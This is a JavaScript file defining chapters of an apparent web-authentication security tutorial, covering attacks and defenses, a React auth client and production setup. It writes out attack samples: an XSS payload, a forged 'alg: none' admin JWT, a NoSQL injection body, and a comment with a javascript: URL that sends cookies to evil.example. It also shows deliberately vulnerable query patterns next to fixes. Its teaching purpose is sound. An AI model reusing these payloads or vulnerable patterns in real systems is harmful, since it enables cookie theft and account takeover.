/* Chapters 11–13: hardening, React client, production */
(function () {
  'use strict';
  const AIM = window.AIM;
  const { code, send, proc, block } = AIM;

  // ================================================================ 11 · Attacks + defenses
  AIM.chapters.push({
    id: 'attacks',
    num: '11',
    group: 'Hardening & shipping',
    short: 'Attacks & defenses',
    title: 'Attacks and the defenses that stop them',
    flowName: 'Eight attacks against one app',
    lede: 'Each of these attacks is common, automated and cheap to try. None of them needs a clever defense, just the right default in the right layer.',
    actors: ['browser', 'api', 'db', 'redis', 'attacker'],
    steps: [
      block('attacker', 'api', 'credential stuffing: 50,000 logins/hour', '429 · Retry-After: 900', 'Credential stuffing',
        `<p>A botnet replays leaked email/password pairs. Per-IP counters catch single machines; per-email counters catch distributed attempts on one account. Both live in Redis, so every API instance enforces the same limit.</p><p>Watch the <code>login.failed</code> rate in your audit log; a sudden spike is your early warning.</p>`),
      block('attacker', 'browser', '<img src=x onerror=steal(localStorage)>', 'escaped by React · blocked by CSP', 'Cross-site scripting (XSS)',
        `<p>The attacker saves HTML into a profile field, hoping another user's browser runs it. React escapes text by default, so it renders as harmless characters. If something slips through (a <code>dangerouslySetInnerHTML</code>, a third-party widget), a strict Content Security Policy refuses to run inline scripts or send data to unknown hosts.</p><p>And even then, there's no long-lived token in <code>localStorage</code> to steal.</p>`),
      block('attacker', 'api', 'evil.example auto-submits POST /api/auth/refresh', 'SameSite=Strict · no X-Requested-With', 'Cross-site request forgery (CSRF)',
        `<p>A page on another site makes the victim's browser send a request to your API, hoping cookies tag along. Three layers stop it:</p><ul><li><code>SameSite=Strict</code>: the browser doesn't attach the cookie to cross-site requests.</li><li>A required <code>X-Requested-With</code> header: HTML forms can't set custom headers, and cross-origin fetch needs a CORS preflight that fails.</li><li>An <code>Origin</code> allowlist on cookie routes.</li></ul>`),
      block('attacker', 'api', "fetch('https://api…/me', { credentials: 'include' })", 'CORS: origin not allowed', 'Reading responses cross-origin',
        `<p>CORS controls which <i>other websites' JavaScript</i> may read your API's responses in a browser. Only <code>APP_URL</code> is allowed, with credentials.</p><p>CORS is not a firewall: curl and servers ignore it. It protects your users' browsers, not your server.</p>`),
      block('attacker', 'api', 'POST /login { "email": { "$ne": null } }', 'zod: expected string', 'NoSQL injection',
        `<p>If the body goes straight into <code>findOne({ email: req.body.email })</code>, the object <code>{"$ne": null}</code> becomes a query operator and matches the first user. Validating every field as a string with zod means operators never reach MongoDB.</p>`),
      block('attacker', 'browser', '<iframe src="app.example.com/settings"> + fake buttons', "frame-ancestors 'none'", 'Clickjacking',
        `<p>The attacker frames your settings page invisibly under a "Claim your prize" button, so the victim's click lands on "Disable 2FA". The CSP directive <code>frame-ancestors 'none'</code> stops browsers from rendering your app inside anyone's frame.</p>`),
      block('attacker', 'api', 'Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.', "algorithms: ['HS256']", 'Forged JWT',
        `<p>An unsigned token with <code>"alg": "none"</code> and <code>"role": "admin"</code>. Libraries that trust the header would accept it. Pinning the algorithm, issuer and audience makes it fail verification.</p>`),
      block('attacker', 'api', 'POST /api/auth/login (12 MB JSON body)', '413 · 100 kb limit', 'Resource exhaustion',
        `<p>Oversized bodies and enormous passwords waste memory and CPU. <code>express.json({ limit: '100kb' })</code>, <code>max(128)</code> on passwords and rate limits before hashing keep each request cheap to reject.</p>`),
      proc('api', 'ok', 'helmet · cors · limits · zod · CSP', 'Defense in depth',
        `<p>No single control is perfect. Each attack above is stopped by at least two independent layers, so one mistake doesn't become a breach.</p>`),
    ],
    concept: `
<h3>XSS: the attack that defeats most other defenses</h3>
<p>If an attacker can run JavaScript on your origin, they can do anything the user can do while the page is open. Prevent it first, then limit the damage:</p>
<ul>
  <li>Let React escape text. Treat every <code>dangerouslySetInnerHTML</code> as a code-review flag and sanitize with DOMPurify.</li>
  <li>Validate URLs you render into <code>href</code> and <code>src</code>: allow only <code>https:</code> and <code>http:</code>, never <code>javascript:</code>.</li>
  <li>Ship a strict CSP from your web server (see <code>nginx.conf</code> in chapter 13).</li>
  <li>Keep tokens out of <code>localStorage</code> so a successful XSS can't walk away with a long-lived credential.</li>
  <li>Audit third-party scripts. Every analytics or chat widget runs with full access to your page.</li>
</ul>
<h3>SameSite in one table</h3>
<div class="table-wrap"><table>
  <thead><tr><th>Value</th><th>Sent on cross-site POST / fetch</th><th>Sent on cross-site link click (GET)</th><th>Use for</th></tr></thead>
  <tbody>
    <tr><td><code>Strict</code></td><td>No</td><td>No</td><td>The refresh cookie</td></tr>
    <tr><td><code>Lax</code> (browser default)</td><td>No</td><td>Yes</td><td>The short-lived OAuth flow cookie</td></tr>
    <tr><td><code>None</code> (requires <code>Secure</code>)</td><td>Yes</td><td>Yes</td><td>Only if your API is on a different site, and then add CSRF tokens</td></tr>
  </tbody>
</table></div>
<p><b>Same-site</b> means the same registrable domain: <code>app.example.com</code> and <code>api.example.com</code> are same-site; <code>myapp.vercel.app</code> and <code>myapi.onrender.com</code> are not. Hosting the API under your own domain keeps cookies simple.</p>
<h3>Security headers checklist</h3>
<dl>
  <dt><code>Strict-Transport-Security</code></dt><dd>Forces HTTPS for two years, including subdomains.</dd>
  <dt><code>Content-Security-Policy</code></dt><dd>Which scripts, styles, images and connections the page may use. <code>frame-ancestors 'none'</code> blocks clickjacking.</dd>
  <dt><code>X-Content-Type-Options: nosniff</code></dt><dd>Stops browsers guessing that a JSON response is HTML.</dd>
  <dt><code>Referrer-Policy</code></dt><dd><code>strict-origin-when-cross-origin</code> for the app, <code>no-referrer</code> on pages with tokens in the URL.</dd>
  <dt><code>Permissions-Policy</code></dt><dd>Turns off camera, microphone and location unless you use them.</dd>
</dl>
<h3>About <code>sanitizeFilter</code> and express-mongo-sanitize</h3>
<p>Mongoose's <code>sanitizeFilter</code> option wraps any <code>$</code> operator inside a filter, <i>including your own</i> (<code>{ expiresAt: { $gt: now } }</code>), unless you mark them with <code>mongoose.trusted()</code>. <code>express-mongo-sanitize</code> doesn't work with Express 5. Strict zod schemas on every input are simpler and catch more.</p>`,
    threats: [
      { name: 'Credential stuffing', risk: 'Leaked password lists replayed by botnets.', fix: 'Redis rate limits per IP and per email; breached-password checks; 2FA; alert on failure spikes.' },
      { name: 'Stored and reflected XSS', risk: 'Attacker HTML or script runs in other users\' browsers with their session.', fix: 'React escaping, DOMPurify for rich text, URL protocol checks, strict CSP, no tokens in storage.' },
      { name: 'CSRF', risk: 'Another site triggers state-changing requests that carry your cookies.', fix: 'Bearer tokens for most routes; <code>SameSite=Strict</code>, custom header and Origin check for the cookie routes.' },
      { name: 'CORS misconfiguration', risk: '<code>origin: true</code> or reflecting any Origin with <code>credentials: true</code> lets every website read your users\' data.', fix: 'An explicit allowlist of exact origins.' },
      { name: 'NoSQL injection', risk: 'Objects with <code>$ne</code>, <code>$gt</code> or <code>$where</code> in user input change query meaning.', fix: 'zod string types on every field; never pass <code>req.body</code> or <code>req.query</code> objects into filters.' },
      { name: 'ReDoS', risk: 'User input turned into a <code>RegExp</code> can take seconds to evaluate and freeze the event loop.', fix: 'Escape input before building regexes, cap its length, or use a text index.' },
      { name: 'Clickjacking', risk: 'Your UI framed invisibly under attacker buttons.', fix: '<code>frame-ancestors \'none\'</code> in CSP (and <code>X-Frame-Options: DENY</code> for old browsers).' },
      { name: 'Vulnerable dependencies', risk: 'A compromised or outdated npm package in your auth path.', fix: '<code>npm audit</code> in CI, Dependabot or Renovate, a lockfile, and few, well-known auth dependencies.' },
    ],
    code: [
      {
        file: 'server/src/middleware/security.js',
        code: code`
import helmet from 'helmet';
import cors from 'cors';
import { env } from '../config/env.js';
import { HttpError } from '../utils/http.js';

const allowedOrigins = new Set([env.APP_URL]);   // exact origins only, never a wildcard

// The API only returns JSON, so its CSP can forbid everything
export const securityHeaders = helmet({
  contentSecurityPolicy: {
    useDefaults: false,
    directives: { defaultSrc: ["'none'"], frameAncestors: ["'none'"] },
  },
  crossOriginResourcePolicy: { policy: 'same-site' },
  referrerPolicy: { policy: 'no-referrer' },
  strictTransportSecurity: { maxAge: 63072000, includeSubDomains: true, preload: true },
});

export const corsPolicy = cors({
  origin: (origin, callback) => callback(null, !origin || allowedOrigins.has(origin)),
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  maxAge: 600,
});

// CSRF guard for the routes that authenticate with the refresh cookie.
// HTML forms can't set custom headers, and a cross-origin fetch with one
// triggers a CORS preflight that fails for unknown origins.
export function requireSameOrigin(req, res, next) {
  const origin = req.get('origin');
  if (req.get('x-requested-with') !== 'fetch' || (origin && !allowedOrigins.has(origin))) {
    throw new HttpError(403, 'Request blocked', 'CSRF');
  }
  next();
}`,
      },
      {
        file: 'server/src/examples/injection-patterns.js',
        note: 'Side-by-side patterns to recognise in code review.',
        code: code`
import { z } from 'zod';
import { User } from '../models/User.js';

// ---------- NoSQL operator injection
// Vulnerable: req.body.email may be { "$ne": null }, which matches the first user in the collection
await User.findOne({ email: req.body.email });

// Safe: zod guarantees a string before it reaches MongoDB
const { email } = z.object({ email: z.string().email() }).parse(req.body);
await User.findOne({ email });

// ---------- Regex built from input (ReDoS + unintended matches)
// Vulnerable: a crafted pattern like (a+)+$ can hang the event loop
await User.find({ name: new RegExp(req.query.q) });

// Safe: cap the length and escape every regex metacharacter
const escapeRegex = (s) => s.replace(/[.*+?^$()|[\]{}\\]/g, (c) => '\\' + c);
const q = z.string().trim().max(50).parse(req.query.q ?? '');
await User.find({ name: new RegExp('^' + escapeRegex(q), 'i') }).limit(20);

// ---------- Mass assignment
// Vulnerable: any field in the schema becomes writable, including role
await User.updateOne({ _id: req.user.id }, req.body);

// Safe: an explicit, strict allowlist per endpoint
const profile = z.object({ name: z.string().trim().min(1).max(80) }).strict().parse(req.body);
await User.updateOne({ _id: req.user.id }, { $set: profile });`,
      },
      {
        file: 'client/src/components/SafeContent.jsx',
        lang: 'jsx',
        code: code`
import DOMPurify from 'dompurify';

// React escapes text by default: this is safe even if bio contains <script>
export function Bio({ bio }) {
  return <p>{bio}</p>;
}

// Only when you truly need user-supplied HTML (rich-text editors): sanitize it first
export function RichText({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html, { USE_PROFILES: { html: true } }) }} />;
}

// href={user.website} could be "javascript:fetch('https://evil.example/?c='+document.cookie)"
export function safeUrl(value) {
  try {
    const url = new URL(value);
    return url.protocol === 'https:' || url.protocol === 'http:' ? url.href : undefined;
  } catch {
    return undefined;
  }
}

export function Website({ url }) {
  const href = safeUrl(url);
  return href ? <a href={href} rel="noopener noreferrer nofollow" target="_blank">{href}</a> : null;
}`,
      },
    ],
    checklist: [
      'helmet is on, with HSTS and a deny-all CSP for the API',
      'CORS allows exact origins only, with <code>credentials: true</code>',
      'Cookie routes require the custom header and an allowed Origin',
      'Every request body field is validated by a zod schema',
      'No <code>dangerouslySetInnerHTML</code> without DOMPurify',
      'The React app is served with a strict CSP and <code>frame-ancestors \'none\'</code>',
      'JSON bodies are capped at 100 kb',
      '<code>npm audit</code> and dependency updates run in CI',
    ],
  });

  // ================================================================ 12 · React client
  AIM.chapters.push({
    id: 'frontend',
    num: '12',
    group: 'Hardening & shipping',
    short: 'The React client',
    title: 'The React client',
    flowName: 'App start-up, protected routes, session loss',
    lede: 'The browser half of auth is a small state machine: loading, signed in, or guest. Get it right and users never see a flash of the wrong page, a stale token or a broken redirect.',
    actors: ['browser', 'api'],
    steps: [
      proc('browser', 'token', "status = 'loading'", 'The app boots knowing nothing',
        `<p>The access token lived in memory, so a reload wiped it. Until the API answers, <code>AuthProvider</code> reports <code>loading</code> and protected pages render a spinner, not the login page and not the dashboard.</p>`),
      send('browser', 'api', 'token', 'POST /api/auth/refresh (cookie, if any)', 'Ask the cookie who we are',
        `<p>One silent call on start-up. If the browser holds a valid refresh cookie, this restores the session.</p>`),
      send('api', 'browser', 'token', '200 { accessToken, user }', 'Session restored',
        `<p>The token goes into the API client's memory, the user into React state.</p>`),
      proc('browser', 'token', "status = 'authenticated'", 'The state machine settles',
        `<p>Components read <code>useAuth()</code>: <code>{ status, user, login, verifyMfa, logout, … }</code>. Nothing else in the app touches tokens.</p>`),
      proc('browser', 'data', '<ProtectedRoute> → <Outlet/>', 'Protected routes render',
        `<p>A layout route wraps every private page. Guests are redirected to <code>/login</code> with the page they wanted saved in router state, so after login they land where they meant to go.</p>`),
      send('browser', 'api', 'token', 'GET /api/projects · Authorization: Bearer', 'Requests carry the token automatically',
        `<p>The axios request interceptor adds the header. Components just call <code>api.get('/projects')</code>.</p>`),
      send('api', 'browser', 'ok', '200 [ … ]', 'Data loads',
        `<p>When the token expires mid-session, the response interceptor from chapter 05 refreshes and retries invisibly.</p>`),
      proc('browser', 'attack', "refresh fails → status = 'guest'", 'Session lost: fail closed',
        `<p>If a refresh is rejected (signed out elsewhere, reuse detected, 60-day cap reached), the interceptor fires <code>auth:session-lost</code>. The provider clears the token and cached data and the router sends the user to login, with a message instead of a broken page.</p>`),
    ],
    concept: `
<h3>The auth state machine</h3>
<div class="table-wrap"><table>
  <thead><tr><th>Status</th><th>Protected routes</th><th>Guest-only routes (login, sign-up)</th></tr></thead>
  <tbody>
    <tr><td><code>loading</code></td><td>Spinner</td><td>Spinner</td></tr>
    <tr><td><code>authenticated</code></td><td>Render</td><td>Redirect to the dashboard</td></tr>
    <tr><td><code>guest</code></td><td>Redirect to <code>/login</code>, remembering the target</td><td>Render</td></tr>
  </tbody>
</table></div>
<h3>Forms that password managers understand</h3>
<dl>
  <dt>Login email</dt><dd><code>type="email" autoComplete="username"</code></dd>
  <dt>Login password</dt><dd><code>type="password" autoComplete="current-password"</code></dd>
  <dt>Sign-up / reset password</dt><dd><code>autoComplete="new-password"</code>, with <code>minLength</code> matching the API</dd>
  <dt>2FA code</dt><dd><code>inputMode="numeric" autoComplete="one-time-code" maxLength={6}</code></dd>
</dl>
<h3>Error messages that help</h3>
<ul>
  <li><code>INVALID_CREDENTIALS</code> → "Invalid email or password." Nothing more specific.</li>
  <li><code>EMAIL_NOT_VERIFIED</code> → explain, and offer a "Resend link" button.</li>
  <li><code>429</code> → "Too many attempts. Wait a few minutes and try again."</li>
  <li>Network error → "Could not reach the server. Check your connection."</li>
</ul>
<h3>Development setup</h3>
<p>Use Vite's dev proxy so the React app and API share one origin (<code>localhost:5173</code>). Cookies, SameSite and CORS then behave as they will in production, where nginx serves the app and proxies <code>/api</code> (chapter 13).</p>
<p class="callout"><b>If you use React Query or SWR,</b> call <code>queryClient.clear()</code> on logout and on session loss so the next person at this computer doesn't see cached data from the last one.</p>`,
    threats: [
      { name: 'Trusting client-side checks', risk: 'Hiding routes and buttons in React feels like security but stops nobody with devtools or curl.', fix: 'Every rule is enforced by the API. Client checks are only for UX.' },
      { name: 'Tokens in storage', risk: '<code>localStorage.setItem(\'token\', …)</code> hands any XSS a credential that works after the tab closes.', fix: 'Access token in a module variable; refresh token in an HttpOnly cookie.' },
      { name: 'Open redirect after login', risk: '<code>/login?next=https://evil.example</code> sends a freshly signed-in user to a phishing page.', fix: 'Accept only paths starting with a single <code>/</code>; default to the dashboard.' },
      { name: 'Data left behind on logout', risk: 'Cached queries and component state still show the previous user\'s data on a shared computer.', fix: 'Clear query caches and reset state on logout and on <code>auth:session-lost</code>; broadcast to other tabs.' },
      { name: 'Flash of the wrong page', risk: 'Rendering the login page during start-up and then jumping to the dashboard looks broken and can briefly expose UI.', fix: 'A distinct <code>loading</code> state that renders a spinner until the refresh call settles.' },
    ],
    code: [
      {
        file: 'client/src/auth/AuthProvider.jsx',
        lang: 'jsx',
        code: code`
import { createContext, useCallback, useContext, useEffect, useMemo, useState } from 'react';
import { api, refreshSession, setAccessToken } from '../api/client';
import { queryClient } from '../queryClient';

const AuthContext = createContext(null);
const channel = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel('auth') : null;

export function AuthProvider({ children }) {
  const [state, setState] = useState({ status: 'loading', user: null });

  const signedIn = useCallback((data) => {
    setAccessToken(data.accessToken);
    setState({ status: 'authenticated', user: data.user });
  }, []);

  const signedOut = useCallback(() => {
    setAccessToken(null);
    queryClient.clear();
    setState({ status: 'guest', user: null });
  }, []);

  const restore = useCallback(
    () => refreshSession().then((data) => setState({ status: 'authenticated', user: data.user })),
    [],
  );

  // Start-up: the refresh cookie is the only memory of a previous login
  useEffect(() => {
    restore().catch(signedOut);
  }, [restore, signedOut]);

  // Session lost (refresh rejected) and changes made in other tabs
  useEffect(() => {
    const onLost = () => signedOut();
    window.addEventListener('auth:session-lost', onLost);
    if (channel) {
      channel.onmessage = (e) => {
        if (e.data === 'logout') signedOut();
        if (e.data === 'login') restore().catch(signedOut);
      };
    }
    return () => {
      window.removeEventListener('auth:session-lost', onLost);
      if (channel) channel.onmessage = null;
    };
  }, [restore, signedOut]);

  const login = useCallback(async (email, password) => {
    const { data } = await api.post('/auth/login', { email, password });
    if (data.mfaRequired) return { mfaToken: data.mfaToken };
    signedIn(data);
    channel?.postMessage('login');
    return {};
  }, [signedIn]);

  const verifyMfa = useCallback(async (mfaToken, { code, backupCode }) => {
    const { data } = await api.post('/auth/mfa/verify', { mfaToken, code, backupCode });
    signedIn(data);
    channel?.postMessage('login');
  }, [signedIn]);

  // After Google sign-in: the API already set the refresh cookie
  const completeExternalLogin = useCallback(async () => {
    await restore();
    channel?.postMessage('login');
  }, [restore]);

  const logout = useCallback(async () => {
    try {
      await api.post('/auth/logout');
    } finally {
      signedOut();
      channel?.postMessage('logout');
    }
  }, [signedOut]);

  const logoutEverywhere = useCallback(async () => {
    try {
      await api.post('/auth/logout-all');
    } finally {
      signedOut();
      channel?.postMessage('logout');
    }
  }, [signedOut]);

  const value = useMemo(
    () => ({ ...state, login, verifyMfa, completeExternalLogin, logout, logoutEverywhere }),
    [state, login, verifyMfa, completeExternalLogin, logout, logoutEverywhere],
  );
  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used inside <AuthProvider>');
  return ctx;
}`,
      },
      {
        file: 'client/src/auth/ProtectedRoute.jsx',
        lang: 'jsx',
        code: code`
import { Navigate, Outlet, useLocation } from 'react-router-dom';
import { useAuth } from './AuthProvider';

function Spinner() {
  return <div className="page-spinner" role="status" aria-live="polite">Loading…</div>;
}

export function ProtectedRoute({ roles }) {
  const { status, user } = useAuth();
  const location = useLocation();

  if (status === 'loading') return <Spinner />;
  if (status === 'guest') {
    return <Navigate to="/login" replace state={{ from: location.pathname + location.search }} />;
  }
  if (roles && !roles.includes(user.role)) return <Navigate to="/dashboard" replace />;
  return <Outlet />;
}

// Login and sign-up pages: signed-in users skip straight to the app
export function GuestOnly() {
  const { status } = useAuth();
  if (status === 'loading') return <Spinner />;
  if (status === 'authenticated') return <Navigate to="/dashboard" replace />;
  return <Outlet />;
}`,
      },
      {
        file: 'client/src/pages/Login.jsx',
        lang: 'jsx',
        code: code`
import { useEffect, useState } from 'react';
import { Link, Navigate, useLocation, useNavigate } from 'react-router-dom';
import { useAuth } from '../auth/AuthProvider';
import { api } from '../api/client';
import { GoogleButton } from './OAuthCallback';

// Only same-app paths: "/projects/1" yes; "//evil.example" and "https://…" no
const safeNext = (from) => (typeof from === 'string' && from.startsWith('/') && !from.startsWith('//') ? from : '/dashboard');

function describeError(err) {
  if (!err.response) return { message: 'Could not reach the server. Check your connection.' };
  const { status, data } = err.response;
  if (status === 429) return { message: 'Too many attempts. Wait a few minutes and try again.' };
  return { message: data?.error ?? 'Something went wrong. Try again.', code: data?.code };
}

export default function Login() {
  const { login } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [mfaToken, setMfaToken] = useState(null);
  const [error, setError] = useState(null);
  const [busy, setBusy] = useState(false);
  const [resent, setResent] = useState(false);

  const goNext = () => navigate(safeNext(location.state?.from), { replace: true });

  async function onSubmit(e) {
    e.preventDefault();
    setBusy(true);
    setError(null);
    try {
      const result = await login(email, password);
      if (result.mfaToken) setMfaToken(result.mfaToken);
      else goNext();
    } catch (err) {
      setError(describeError(err));
    } finally {
      setBusy(false);
    }
  }

  async function resend() {
    await api.post('/auth/resend-verification', { email }).catch(() => {});
    setResent(true);
  }

  if (mfaToken) return <MfaStep mfaToken={mfaToken} onDone={goNext} onExpired={() => setMfaToken(null)} />;

  return (
    <form onSubmit={onSubmit}>
      <h1>Sign in</h1>
      <label htmlFor="email">Email</label>
      <input id="email" type="email" autoComplete="username" required value={email} onChange={(e) => setEmail(e.target.value)} />
      <label htmlFor="password">Password</label>
      <input id="password" type="password" autoComplete="current-password" required value={password} onChange={(e) => setPassword(e.target.value)} />
      <button disabled={busy}>{busy ? 'Signing in…' : 'Sign in'}</button>

      {error && (
        <p role="alert">
          {error.message}{' '}
          {error.code === 'EMAIL_NOT_VERIFIED' && !resent && <button type="button" onClick={resend}>Resend link</button>}
          {resent && 'We sent a new link.'}
        </p>
      )}

      <Link to="/forgot-password">Forgot your password?</Link>
      <GoogleButton />
    </form>
  );
}

export function MfaStep({ mfaToken, onDone, onExpired }) {
  const { verifyMfa } = useAuth();
  const [code, setCode] = useState('');
  const [useBackup, setUseBackup] = useState(false);
  const [error, setError] = useState('');

  async function onSubmit(e) {
    e.preventDefault();
    setError('');
    try {
      await verifyMfa(mfaToken, useBackup ? { backupCode: code } : { code });
      onDone();
    } catch (err) {
      if (err.response?.data?.code === 'MFA_TOKEN_INVALID') return onExpired();
      setError(describeError(err).message);
    }
  }

  return (
    <form onSubmit={onSubmit}>
      <h1>Two-factor authentication</h1>
      <label htmlFor="mfa-code">{useBackup ? 'Backup code' : '6-digit code from your authenticator app'}</label>
      <input id="mfa-code" autoFocus required value={code} onChange={(e) => setCode(e.target.value)}
        {...(useBackup ? { autoComplete: 'off' } : { inputMode: 'numeric', autoComplete: 'one-time-code', maxLength: 6 })} />
      <button>Verify</button>
      <button type="button" onClick={() => { setUseBackup(!useBackup); setCode(''); }}>
        {useBackup ? 'Use authenticator code' : 'Lost your phone? Use a backup code'}
      </button>
      {error && <p role="alert">{error}</p>}
    </form>
  );
}

// /login/mfa#ticket=… after Google sign-in for users with 2FA on
export function MfaFromTicket() {
  const navigate = useNavigate();
  const [ticket] = useState(() => new URLSearchParams(window.location.hash.slice(1)).get('ticket'));
  useEffect(() => { window.history.replaceState(null, '', '/login/mfa'); }, []);
  if (!ticket) return <Navigate to="/login" replace />;
  return <MfaStep mfaToken={ticket} onDone={() => navigate('/dashboard', { replace: true })} onExpired={() => navigate('/login', { replace: true })} />;
}`,
      },
      {
        file: 'client/src/App.jsx',
        lang: 'jsx',
        code: code`
import { BrowserRouter, Navigate, Route, Routes } from 'react-router-dom';
import { QueryClientProvider } from '@tanstack/react-query';
import { queryClient } from './queryClient';
import { AuthProvider } from './auth/AuthProvider';
import { ProtectedRoute, GuestOnly } from './auth/ProtectedRoute';
import Login, { MfaFromTicket } from './pages/Login';
import Register from './pages/Register';
import VerifyEmail from './pages/VerifyEmail';
import ForgotPassword from './pages/ForgotPassword';
import ResetPassword from './pages/ResetPassword';
import OAuthCallback from './pages/OAuthCallback';
import Dashboard from './pages/Dashboard';
import Security from './pages/Security';      // TwoFactorSetup + Sessions + change password
import AdminUsers from './pages/AdminUsers';

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <AuthProvider>
        <BrowserRouter>
          <Routes>
            <Route element={<GuestOnly />}>
              <Route path="/login" element={<Login />} />
              <Route path="/login/mfa" element={<MfaFromTicket />} />
              <Route path="/register" element={<Register />} />
              <Route path="/forgot-password" element={<ForgotPassword />} />
            </Route>

            {/* Reachable signed in or out */}
            <Route path="/verify-email" element={<VerifyEmail />} />
            <Route path="/reset-password" element={<ResetPassword />} />
            <Route path="/auth/callback" element={<OAuthCallback />} />

            <Route element={<ProtectedRoute />}>
              <Route path="/dashboard" element={<Dashboard />} />
              <Route path="/settings/security" element={<Security />} />
            </Route>

            <Route element={<ProtectedRoute roles={['admin']} />}>
              <Route path="/admin/users" element={<AdminUsers />} />
            </Route>

            <Route path="*" element={<Navigate to="/dashboard" replace />} />
          </Routes>
        </BrowserRouter>
      </AuthProvider>
    </QueryClientProvider>
  );
}`,
      },
      {
        file: 'client/vite.config.js',
        note: 'One origin in development, exactly like production behind nginx. Set APP_URL=http://localhost:5173 in the API\'s .env.',
        code: code`
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  server: {
    port: 5173,
    proxy: {
      '/api': { target: 'http://localhost:4000' },   // the browser only ever talks to :5173
    },
  },
});

// client/src/queryClient.js
// import { QueryClient } from '@tanstack/react-query';
// export const queryClient = new QueryClient();`,
      },
    ],
    checklist: [
      'The access token lives only in the API client module',
      'The app calls <code>/auth/refresh</code> once on start-up and shows a loading state until it settles',
      'Private pages sit under one <code>&lt;ProtectedRoute&gt;</code> layout route',
      'Post-login redirects accept only same-app paths',
      'Logout and session loss clear query caches and broadcast to other tabs',
      'Inputs use the right <code>autoComplete</code> values',
      'Error messages map API codes to plain, actionable text',
      'Development uses the Vite proxy, so app and API share an origin',
    ],
  });

  // ================================================================ 13 · Production
  AIM.chapters.push({
    id: 'production',
    num: '13',
    group: 'Hardening & shipping',
    short: 'Production checklist',
    title: 'Going to production',
    flowName: 'The whole system, running for real',
    lede: 'Auth that works on localhost is half the job. Production adds proxies, multiple instances, real email, secrets, monitoring and the day something goes wrong.',
    actors: ['browser', 'api', 'db', 'redis', 'mail', 'phone', 'google', 'attacker'],
    steps: [
      send('browser', 'api', 'data', 'https://app.example.com/api/* via nginx', 'One origin, HTTPS only',
        `<p>nginx (or your platform's load balancer) terminates TLS, serves the built React app and proxies <code>/api</code> to Node. The browser sees one origin, so the refresh cookie is first-party and SameSite works without exceptions.</p>`),
      proc('api', 'ok', "trust proxy 1 · HSTS · X-Forwarded-For", 'Know your real client IP',
        `<p>Behind a proxy, <code>req.ip</code> is the proxy's address unless you set <code>trust proxy</code> to the exact number of hops. Get it wrong and every user shares a rate limit, or attackers spoof <code>X-Forwarded-For</code> to dodge it.</p>`),
      send('api', 'redis', 'data', 'shared limits · user cache · mail queue', 'State shared across instances',
        `<p>Run two or more API instances and anything kept in process memory (rate-limit counters, caches) silently splits. Redis gives every instance the same view. Use a managed Redis with TLS and a password.</p>`),
      send('api', 'db', 'data', 'unique + TTL indexes · Atlas backups', 'MongoDB in production',
        `<p>Unique indexes on <code>email</code>, <code>googleId</code> and <code>tokenHash</code>; TTL indexes on tokens and audit logs; a least-privilege database user; IP allowlist or private networking; point-in-time backups you have actually restored once.</p>`),
      send('api', 'mail', 'mail', 'SPF · DKIM · DMARC aligned', 'Email that arrives',
        `<p>If verification and reset emails land in spam, your users can't recover accounts. Use a dedicated sending subdomain, authenticate it, and watch bounce and complaint rates in your provider's dashboard.</p>`),
      proc('api', 'data', 'audit: login.success, mfa.enabled, session.reuse_detected…', 'Write an audit trail',
        `<p>Every security-relevant event gets a structured record: who, what, when, from where. It's how you answer "was my account accessed?" and how you spot attacks in progress.</p>`),
      block('attacker', 'api', 'stolen refresh token replayed', 'family revoked · alert sent', 'Alerts turn events into action',
        `<p>Reuse detection, a spike in failed logins, many MFA failures for one user, an admin disabling accounts at 3am: route these events to Slack, PagerDuty or email so a human looks within minutes.</p>`),
      send('google', 'api', 'token', 'redirect URIs registered per environment', 'Per-environment configuration',
        `<p>Separate Google OAuth clients, JWT secrets, cookie secrets and databases for development, staging and production. A leaked staging secret must not open production.</p>`),
      send('api', 'browser', 'ok', 'tests green · secrets in a vault · runbook ready', 'Ship it',
        `<p>Automated tests for the dangerous paths, secrets in your platform's secret store, and a written plan for "we think a secret leaked". Then launch.</p>`),
    ],
    concept: `
<h3>Deployment topology</h3>
<div class="table-wrap"><table>
  <thead><tr><th>Layout</th><th>Cookies</th><th>Verdict</th></tr></thead>
  <tbody>
    <tr><td><code>app.example.com</code> serves React and proxies <code>/api</code></td><td>First-party, <code>SameSite=Strict</code> works</td><td><span class="good">Simplest</span></td></tr>
    <tr><td><code>app.example.com</code> + <code>api.example.com</code></td><td>Same-site; set <code>APP_URL</code> for CORS, cookies still fine</td><td><span class="good">Fine</span></td></tr>
    <tr><td><code>myapp.vercel.app</code> + <code>myapi.onrender.com</code></td><td>Cross-site: needs <code>SameSite=None</code>, CSRF tokens, and some browsers block third-party cookies</td><td><span class="bad">Avoid</span>: put both behind your own domain</td></tr>
  </tbody>
</table></div>
<h3>Secrets</h3>
<ul>
  <li>Generate each secret with <code>crypto.randomBytes(32)</code>. Never commit <code>.env</code>; commit <code>.env.example</code>.</li>
  <li>Store them in your platform's secret manager (Render, Railway, Fly, AWS Secrets Manager, Doppler).</li>
  <li><b>Rotation plan:</b> to rotate the JWT secret without logging everyone out, add a <code>kid</code> (key id) header, verify against both old and new keys for 15 minutes, then drop the old one. Rotating <code>MFA_ENC_KEY</code> requires re-encrypting stored secrets, so keep the key id with each ciphertext once you need rotation.</li>
</ul>
<h3>Audit events worth recording</h3>
<p><code>user.registered</code>, <code>user.email_verified</code>, <code>login.success</code>, <code>login.failed</code>, <code>login.google_failed</code>, <code>mfa.enabled</code>, <code>mfa.disabled</code>, <code>mfa.failed</code>, <code>mfa.backup_code_used</code>, <code>password.changed</code>, <code>password.reset_requested</code>, <code>password.reset</code>, <code>session.revoked</code>, <code>session.reuse_detected</code>, <code>logout</code>, <code>logout.all</code>, <code>admin.user_disabled</code>.</p>
<h3>Alerts to configure on day one</h3>
<ul>
  <li>Any <code>session.reuse_detected</code>.</li>
  <li><code>login.failed</code> more than 5× its normal hourly rate.</li>
